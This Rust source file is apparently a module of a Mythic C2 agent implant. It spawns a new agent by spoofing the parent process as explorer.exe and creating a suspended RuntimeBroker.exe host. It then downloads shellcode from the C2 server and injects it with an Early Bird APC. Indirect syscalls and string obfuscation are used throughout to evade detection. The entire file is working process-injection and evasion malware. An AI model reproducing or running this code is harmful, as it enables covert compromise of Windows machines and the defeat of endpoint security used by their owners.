//! selfclone — spawn a new agent (optional PPID spoof + Early Bird APC).
//!
//! # Modes
//! - **earlybird** (default): Create a sacrificial host `CREATE_SUSPENDED`, write Donut
//!   shellcode, `NtQueueApcThread` on the primary thread, then `NtResumeThread`.
//! - **process**: legacy CreateProcess of the on-disk EXE.
//!
//! # Parent
//! - Process **name** (e.g. `explorer.exe`): PPID spoof via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`.
//! - **`self`**: no PPID spoof — the new process is a real child of this agent.

use crate::transport;
use callghost::syscall;

use std::mem;
use std::ptr;
use std::slice;

use base64::engine::general_purpose;
use base64::Engine;
use obfstr::obfstr;
use serde::Deserialize;
use serde_json::{json, Value};
use winapi::shared::minwindef::{FALSE, LPVOID};
use winapi::shared::ntdef::{HANDLE, LARGE_INTEGER, PVOID, ULONG, UNICODE_STRING};
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::GetModuleFileNameW;
use winapi::um::processthreadsapi::{
    CreateProcessW, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
    UpdateProcThreadAttribute, PROCESS_INFORMATION, STARTUPINFOW,
};
use winapi::um::winbase::{
    CREATE_NO_WINDOW, CREATE_SUSPENDED, EXTENDED_STARTUPINFO_PRESENT,
};
use winapi::um::winnt::PROCESS_ALL_ACCESS;

const MAX_PATH_LEN: usize = 260;
const SystemProcessInformation: u32 = 5;
const BUFFER_SIZE: usize = 0x100000;
const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const CHUNK_SIZE: usize = 4096;

type LONG = i32;
type KPRIORITY = LONG;

#[repr(C)]
struct SYSTEM_THREAD_INFORMATION {
    Reserved1: [LARGE_INTEGER; 3],
    Reserved2: [usize; 2],
    StartAddress: PVOID,
    ClientId: [PVOID; 2],
    Priority: LONG,
    BasePriority: LONG,
    ContextSwitches: ULONG,
    ThreadState: ULONG,
    WaitReason: ULONG,
}

#[repr(C)]
struct SYSTEM_PROCESS_INFORMATION {
    NextEntryOffset: ULONG,
    NumberOfThreads: ULONG,
    WorkingSetPrivateSize: LARGE_INTEGER,
    HardFaultCount: ULONG,
    NumberOfThreadsHighWatermark: ULONG,
    CycleTime: u64,
    CreateTime: LARGE_INTEGER,
    UserTime: LARGE_INTEGER,
    KernelTime: LARGE_INTEGER,
    ImageName: UNICODE_STRING,
    BasePriority: KPRIORITY,
    UniqueProcessId: PVOID,
    InheritedFromUniqueProcessId: PVOID,
    HandleCount: ULONG,
    SessionId: ULONG,
    UniqueProcessKey: usize,
    PeakVirtualSize: usize,
    VirtualSize: usize,
    PageFaultCount: ULONG,
    PeakWorkingSetSize: usize,
    WorkingSetSize: usize,
    QuotaPeakPagedPoolUsage: usize,
    QuotaPagedPoolUsage: usize,
    QuotaPeakNonPagedPoolUsage: usize,
    QuotaNonPagedPoolUsage: usize,
    PagefileUsage: usize,
    PeakPagefileUsage: usize,
    PrivatePageCount: usize,
    ReadOperationCount: i64,
    WriteOperationCount: i64,
    OtherOperationCount: i64,
    ReadTransferCount: i64,
    WriteTransferCount: i64,
    OtherTransferCount: i64,
    Threads: [SYSTEM_THREAD_INFORMATION; 1],
}

#[repr(C)]
struct STARTUPINFOEXW {
    startup_info: STARTUPINFOW,
    lp_attribute_list: PVOID,
}

#[derive(Deserialize)]
struct SelfCloneParams {
    #[serde(default = "default_mode")]
    mode: String,
    #[serde(default = "default_parent")]
    parent: String,
    #[serde(default = "default_host")]
    host: String,
    #[serde(default)]
    shellcode_file_id: String,
}

fn default_mode() -> String {
    "earlybird".into()
}
fn default_parent() -> String {
    "explorer.exe".into()
}
fn default_host() -> String {
    r"C:\Windows\System32\RuntimeBroker.exe".into()
}

/// Find the PID of a process by name using NtQuerySystemInformation via indirect syscall.
unsafe fn find_process_pid(target_name: &str) -> Option<u32> {
    let mut buffer = vec![0u8; BUFFER_SIZE];
    let mut return_len: ULONG = 0;

    let status = syscall!(
        indirect,
        NtQuerySystemInformation,
        SystemProcessInformation,
        buffer.as_mut_ptr(),
        BUFFER_SIZE as u32,
        &mut return_len
    );

    if status != 0 {
        return None;
    }

    let target_lower = target_name.to_lowercase();
    let mut offset = 0usize;

    while offset < return_len as usize {
        let proc_info = buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION;
        let pid = (*proc_info).UniqueProcessId as u32;

        if (*proc_info).ImageName.Length > 0 {
            let name_slice = slice::from_raw_parts(
                (*proc_info).ImageName.Buffer,
                (*proc_info).ImageName.Length as usize / 2,
            );
            let name = String::from_utf16_lossy(name_slice).to_lowercase();
            if name == target_lower {
                return Some(pid);
            }
        }

        if (*proc_info).NextEntryOffset == 0 {
            break;
        }
        offset += (*proc_info).NextEntryOffset as usize;
    }

    None
}

/// Open a process handle via NtOpenProcess indirect syscall.
unsafe fn open_process(pid: u32) -> Option<HANDLE> {
    #[repr(C)]
    struct OBJECT_ATTRIBUTES {
        Length: ULONG,
        RootDirectory: HANDLE,
        ObjectName: PVOID,
        Attributes: ULONG,
        SecurityDescriptor: PVOID,
        SecurityQualityOfService: PVOID,
    }

    #[repr(C)]
    struct CLIENT_ID {
        UniqueProcess: HANDLE,
        UniqueThread: HANDLE,
    }

    let mut handle: HANDLE = ptr::null_mut();

    let mut oa: OBJECT_ATTRIBUTES = mem::zeroed();
    oa.Length = mem::size_of::<OBJECT_ATTRIBUTES>() as ULONG;

    let mut cid: CLIENT_ID = mem::zeroed();
    cid.UniqueProcess = pid as usize as HANDLE;

    let status = syscall!(
        indirect,
        NtOpenProcess,
        &mut handle,
        PROCESS_ALL_ACCESS,
        &mut oa as *mut _ as *mut u8,
        &mut cid as *mut _ as *mut u8
    );

    if status == 0 && !handle.is_null() {
        Some(handle)
    } else {
        None
    }
}

/// Build a UTF-16 null-terminated path buffer for CreateProcessW.
fn to_wide_path(path: &str) -> Vec<u16> {
    let mut wide: Vec<u16> = path.encode_utf16().collect();
    wide.push(0);
    wide
}

/// Create a process, optionally with a spoofed parent.
///
/// - `parent_handle = Some(h)` → `EXTENDED_STARTUPINFO` + `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`
/// - `parent_handle = None` → normal CreateProcess (child of this agent; `parent=self`)
///
/// Returns (pid, hProcess, hThread). Caller owns the handles when `leave_handles` is true.
unsafe fn create_process(
    app_path: &[u16],
    parent_handle: Option<HANDLE>,
    creation_flags: u32,
    leave_handles: bool,
) -> Result<(u32, HANDLE, HANDLE), String> {
    let mut pi: PROCESS_INFORMATION = mem::zeroed();

    let ret = if let Some(parent_handle) = parent_handle {
        let mut attr_size: usize = 0;
        InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut attr_size as *mut _);
        if attr_size == 0 {
            return Err("Failed to get attribute list size".into());
        }

        let attr_list = vec![0u8; attr_size];
        let attr_list_ptr = attr_list.as_ptr() as PVOID;

        let ret = InitializeProcThreadAttributeList(
            attr_list_ptr as *mut _,
            1,
            0,
            &mut attr_size as *mut _,
        );
        if ret == 0 {
            return Err("InitializeProcThreadAttributeList failed".into());
        }

        let mut parent_h = parent_handle;
        let ret = UpdateProcThreadAttribute(
            attr_list_ptr as *mut _,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &mut parent_h as *mut _ as LPVOID,
            mem::size_of::<HANDLE>(),
            ptr::null_mut(),
            ptr::null_mut(),
        );
        if ret == 0 {
            DeleteProcThreadAttributeList(attr_list_ptr as *mut _);
            return Err("UpdateProcThreadAttribute failed".into());
        }

        let mut si_ex: STARTUPINFOEXW = mem::zeroed();
        si_ex.startup_info.cb = mem::size_of::<STARTUPINFOEXW>() as u32;
        si_ex.lp_attribute_list = attr_list_ptr;

        let ret = CreateProcessW(
            app_path.as_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            FALSE,
            EXTENDED_STARTUPINFO_PRESENT | creation_flags,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut si_ex.startup_info as *mut _,
            &mut pi as *mut _,
        );
        DeleteProcThreadAttributeList(attr_list_ptr as *mut _);
        ret
    } else {
        // No PPID spoof — standard STARTUPINFOW, real parent is this process.
        let mut si: STARTUPINFOW = mem::zeroed();
        si.cb = mem::size_of::<STARTUPINFOW>() as u32;
        CreateProcessW(
            app_path.as_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            FALSE,
            creation_flags,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut si as *mut _,
            &mut pi as *mut _,
        )
    };

    if ret == 0 {
        return Err("CreateProcessW failed".into());
    }

    let pid = pi.dwProcessId;
    if leave_handles {
        Ok((pid, pi.hProcess, pi.hThread))
    } else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        Ok((pid, ptr::null_mut(), ptr::null_mut()))
    }
}

/// Legacy: spawn a copy of the on-disk EXE (optional PPID spoof).
fn clone_process_mode(parent_handle: Option<HANDLE>) -> Result<u32, String> {
    unsafe {
        let mut path_buf = [0u16; MAX_PATH_LEN * 2];
        let len = GetModuleFileNameW(
            ptr::null_mut(),
            path_buf.as_mut_ptr(),
            (MAX_PATH_LEN * 2) as u32,
        );
        if len == 0 {
            return Err("Failed to get own executable path".into());
        }
        // CREATE_NO_WINDOW keeps console agents quiet; GUI subsystem ignores it.
        let (pid, _, _) = create_process(
            &path_buf[..(len as usize + 1)],
            parent_handle,
            CREATE_NO_WINDOW,
            false,
        )?;
        Ok(pid)
    }
}

/// Early Bird: suspended host (+ optional PPID spoof) + remote APC shellcode.
unsafe fn earlybird_inject(
    parent_handle: Option<HANDLE>,
    host_path: &str,
    shellcode: &[u8],
) -> Result<u32, String> {
    if shellcode.is_empty() {
        return Err("empty shellcode".into());
    }

    let host_wide = to_wide_path(host_path);
    let (pid, h_process, h_thread) = create_process(
        &host_wide,
        parent_handle,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        true,
    )?;

    let cleanup = |h_process: HANDLE, h_thread: HANDLE| {
        if !h_process.is_null() {
            // Best-effort terminate so we don't leave a suspended corpse on failure.
            let _ = syscall!(indirect, NtTerminateProcess, h_process, 1u32);
            crate::nt_mem::close_handle(h_process as *mut _);
        }
        if !h_thread.is_null() {
            crate::nt_mem::close_handle(h_thread as *mut _);
        }
    };

    // Allocate RW in the host
    let mut base: *mut core::ffi::c_void = ptr::null_mut();
    let mut region_size = shellcode.len();
    let status = syscall!(
        indirect,
        NtAllocateVirtualMemory,
        h_process,
        &mut base,
        0usize,
        &mut region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if status != 0 || base.is_null() {
        cleanup(h_process, h_thread);
        return Err(format!("NtAllocateVirtualMemory failed: 0x{:08X}", status as u32));
    }

    let mut written: usize = 0;
    let status = syscall!(
        indirect,
        NtWriteVirtualMemory,
        h_process,
        base,
        shellcode.as_ptr(),
        shellcode.len(),
        &mut written
    );
    if status != 0 || written != shellcode.len() {
        cleanup(h_process, h_thread);
        return Err(format!(
            "NtWriteVirtualMemory failed: 0x{:08X} written={}",
            status as u32, written
        ));
    }

    // RW → RX (no RWX)
    let mut prot_base = base;
    let mut prot_size = shellcode.len();
    let mut old_prot: u32 = 0;
    let status = syscall!(
        indirect,
        NtProtectVirtualMemory,
        h_process,
        &mut prot_base,
        &mut prot_size,
        PAGE_EXECUTE_READ,
        &mut old_prot
    );
    if status != 0 {
        cleanup(h_process, h_thread);
        return Err(format!("NtProtectVirtualMemory failed: 0x{:08X}", status as u32));
    }

    // Queue APC on the primary thread (Early Bird)
    let status = syscall!(
        indirect,
        NtQueueApcThread,
        h_thread,
        base,
        ptr::null_mut::<u8>(),
        ptr::null_mut::<u8>(),
        ptr::null_mut::<u8>()
    );
    if status != 0 {
        cleanup(h_process, h_thread);
        return Err(format!("NtQueueApcThread failed: 0x{:08X}", status as u32));
    }

    // Resume — APC runs before host entry
    let mut suspend_count: u32 = 0;
    let status = syscall!(
        indirect,
        NtResumeThread,
        h_thread,
        &mut suspend_count
    );
    if status != 0 {
        cleanup(h_process, h_thread);
        return Err(format!("NtResumeThread failed: 0x{:08X}", status as u32));
    }

    // Detach: leave the host running independently
    crate::nt_mem::close_handle(h_process as *mut _);
    crate::nt_mem::close_handle(h_thread as *mut _);

    Ok(pid)
}

fn download_file(task_id: &str, file_id: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut file_bytes = Vec::new();
    let mut chunk_num = 1usize;
    let mut total_chunks = 1usize;

    while chunk_num <= total_chunks {
        let payload = json!({
            obfstr!("action"): obfstr!("post_response"),
            obfstr!("responses"): [{
                obfstr!("upload"): {
                    obfstr!("chunk_size"): CHUNK_SIZE,
                    obfstr!("file_id"): file_id,
                    obfstr!("chunk_num"): chunk_num,
                },
                obfstr!("task_id"): task_id,
                obfstr!("completed"): true
            }]
        })
        .to_string();
        let resp: Value = crate::transport::send_request_with_response(&payload)?;
        let entry = &resp[obfstr!("responses")][0];
        total_chunks = entry[obfstr!("total_chunks")]
            .as_u64()
            .ok_or("Bad total_chunks")? as usize;
        let chunk_data = entry[obfstr!("chunk_data")]
            .as_str()
            .ok_or("Missing chunk_data")?;
        let bytes = general_purpose::STANDARD.decode(chunk_data)?;
        file_bytes.extend_from_slice(&bytes);
        chunk_num += 1;
    }

    Ok(file_bytes)
}

pub fn selfclone(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let id = task.get("id").unwrap().as_str().unwrap();
    let timestamp = task.get(obfstr!("timestamp")).unwrap().as_f64().unwrap();

    let params_str = task
        .get("parameters")
        .and_then(|p| p.as_str())
        .unwrap_or("{}");
    let params: SelfCloneParams =
        serde_json::from_str(params_str).unwrap_or(SelfCloneParams {
            mode: default_mode(),
            parent: default_parent(),
            host: default_host(),
            shellcode_file_id: String::new(),
        });

    let mode = params.mode.to_lowercase();
    let parent_name = params.parent;
    let host_path = params.host;
    // parent=self → real parent is this process (no PROC_THREAD_ATTRIBUTE_PARENT_PROCESS).
    let no_spoof = parent_name.eq_ignore_ascii_case("self");

    crate::helpers::churn(&parent_name);

    let (output, status) = unsafe {
        // Resolve optional spoof parent handle.
        let parent_open: Result<(Option<u32>, Option<HANDLE>), String> = if no_spoof {
            Ok((None, None))
        } else {
            match find_process_pid(&parent_name) {
                None => Err(format!("Failed to find parent process: {}", parent_name)),
                Some(parent_pid) => match open_process(parent_pid) {
                    None => Err(format!(
                        "Failed to open handle to {} (PID {})",
                        parent_name, parent_pid
                    )),
                    Some(h) => Ok((Some(parent_pid), Some(h))),
                },
            }
        };

        match parent_open {
            Err(e) => (e, "error"),
            Ok((parent_pid, parent_handle)) => {
                let result = if mode == "process" {
                    clone_process_mode(parent_handle)
                } else if params.shellcode_file_id.is_empty() {
                    Err(
                        "earlybird mode requires shellcode_file_id from Mythic container".into(),
                    )
                } else {
                    match download_file(id, &params.shellcode_file_id) {
                        Ok(sc) => {
                            crate::helpers::churn("earlybird_sc");
                            earlybird_inject(parent_handle, &host_path, &sc)
                        }
                        Err(e) => Err(format!("shellcode download failed: {}", e)),
                    }
                };

                if let Some(h) = parent_handle {
                    crate::nt_mem::close_handle(h as *mut _);
                }

                match result {
                    Ok(new_pid) => {
                        if mode == "process" {
                            if no_spoof {
                                (
                                    format!(
                                        "Cloned without PPID spoof (parent=self). New process PID: {}",
                                        new_pid
                                    ),
                                    "success",
                                )
                            } else {
                                (
                                    format!(
                                        "Cloned under {} (PID {}). New process PID: {}",
                                        parent_name,
                                        parent_pid.unwrap_or(0),
                                        new_pid
                                    ),
                                    "success",
                                )
                            }
                        } else if no_spoof {
                            (
                                format!(
                                    "Early Bird without PPID spoof (parent=self) host={} → new PID {}",
                                    host_path, new_pid
                                ),
                                "success",
                            )
                        } else {
                            (
                                format!(
                                    "Early Bird under {} (PID {}) host={} → new PID {}",
                                    parent_name,
                                    parent_pid.unwrap_or(0),
                                    host_path,
                                    new_pid
                                ),
                                "success",
                            )
                        }
                    }
                    Err(e) => (format!("selfclone failed: {}", e), "error"),
                }
            }
        }
    };

    let response_json = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [
            {
                obfstr!("task_id"): id,
                obfstr!("user_output"): output,
                obfstr!("timestamp"): timestamp,
                obfstr!("status"): status,
                obfstr!("completed"): true,
            }
        ]
    });

    let response_value = serde_json::to_string(&response_json)?;
    transport::send_request(&response_value)?;

    Ok(())
}
